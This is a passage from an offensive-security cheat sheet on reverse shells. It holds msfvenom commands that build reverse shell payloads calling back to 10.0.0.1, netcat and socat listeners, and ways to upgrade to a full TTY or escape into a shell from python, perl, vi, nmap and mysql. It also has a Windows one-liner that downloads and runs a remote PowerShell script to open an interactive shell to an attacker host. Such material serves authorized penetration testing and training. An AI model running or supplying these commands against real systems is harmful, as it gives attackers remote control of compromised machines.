$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## Spawn TTY Shell

In order to catch a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with `[CTRL] + [L]`.

```powershell
rlwrap nc 10.0.0.1 4242

rlwrap -r -f . nc 10.0.0.1 4242
-f . will make rlwrap use the current history file as a completion word list.
-r Put all words seen on in- and output on the completion list.
```

Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.

:warning: OhMyZSH might break this trick, a simple `sh` is recommended

> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect

```powershell
ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

or use `socat` binary to get a fully tty reverse shell

```bash
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

Spawn a TTY shell from an interpreter

```powershell
/bin/sh -i
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c "__import__('pty').spawn('/bin/bash')"
python3 -c "__import__('subprocess').call(['/bin/bash'])"
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl -e 'print `/bin/bash`'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
```

- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`
- mysql: `! bash`

Alternative TTY method

```
www-data@debian:/dev/shm$ su - user
su: must be run from a terminal

www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
www-data@debian:/dev/shm$ su - user
Password: P4ssW0rD

user@debian:~$ 
```

## Fully interactive reverse shell on Windows
The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.

**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**


Server Side:

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Client Side:

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1

## References

* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Spawning a TTY Shell](http://netsec.ws/?p=337)
* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
